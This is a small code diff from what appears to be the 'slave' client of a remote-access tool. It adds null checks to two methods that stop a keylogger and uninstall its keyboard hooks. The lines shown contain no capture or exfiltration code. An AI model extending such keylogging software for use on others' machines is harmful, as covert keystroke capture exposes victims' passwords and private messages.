@@ -19,13 +19,13 @@ namespace Slave.Commands.Core
         /// Stop the keylogger from listening to keypresses
         /// </summary>
         public void StopKeyloggerListening()
-            => keyLoggerManager.StopListening();
+            => keyLoggerManager?.StopListening();
 
         /// <summary>
         /// Stop the keylogger, uninstall keyboard hooks
         /// </summary>
         public void StopKeylogger()
-            => keyLoggerManager.Stop();
+            => keyLoggerManager?.Stop();
 
         /// <summary>
         /// Produce a string displaying a table from a list of Tuple(string, string)
